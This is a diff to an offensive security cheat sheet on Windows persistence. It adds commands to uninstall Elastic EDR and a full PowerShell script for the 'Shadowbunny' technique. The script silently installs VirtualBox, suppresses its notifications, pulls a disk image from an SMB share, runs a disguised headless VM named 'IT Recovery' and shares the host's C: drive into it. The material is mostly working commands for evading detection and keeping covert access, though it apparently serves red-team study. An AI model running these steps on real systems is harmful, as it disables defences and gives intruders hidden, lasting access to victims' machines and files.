@@ -32,6 +32,7 @@
         * [sethc.exe](#sethc.exe)
     * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
+    * [Virtual Machines](#virtual-machines)
 * [Domain](#domain)
     * [Golden Certificate](#golden-certificate)
     * [Golden Ticket](#golden-ticket)
@@ -56,6 +57,13 @@ PS> attrib +h mimikatz.exe
 
 * [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
 * [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
+* [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)
+    ```ps1
+    cd "C:\Program Files\Elastic\Agent\"
+    PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
+    Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
+    Elastic Agent has been uninstalled.
+    ```
 
 ### Disable Windows Defender
 
@@ -403,6 +411,54 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
 
+
+### Virtual Machines
+
+> Based on the Shadow Bunny technique.
+
+```ps1
+# download virtualbox
+Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
+
+# perform a silent install and avoid creating desktop and quick launch icons
+VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
+
+# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
+# Disabling notifications
+.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 
+
+# Download the Virtual machine disk
+Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
+
+# Create a new VM
+$vmname = "IT Recovery"
+.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register
+
+# Add a network card in NAT mode
+.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
+.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
+.\VBoxManage.exe modifyvm $vmname --nic1 nat
+.\VBoxManage.exe modifyvm $vmname --audio none
+.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
+.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"
+
+# Mount the VHD file
+.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
+.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0
+
+# Start the VM
+.\VBoxManage.exe startvm $vmname –type headless 
+
+
+# optional - adding a shared folder
+# require: VirtualBox Guest Additions
+.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
+# then mount the folder in the VM
+sudo mkdir /mnt/c
+sudo mount -t vboxsf shadow_c /mnt/c
+```
+
+
 ## Domain
 
 ### User Certificate
@@ -464,3 +520,4 @@ kerberos::tgt
 * [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
 * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
 * [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
+* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
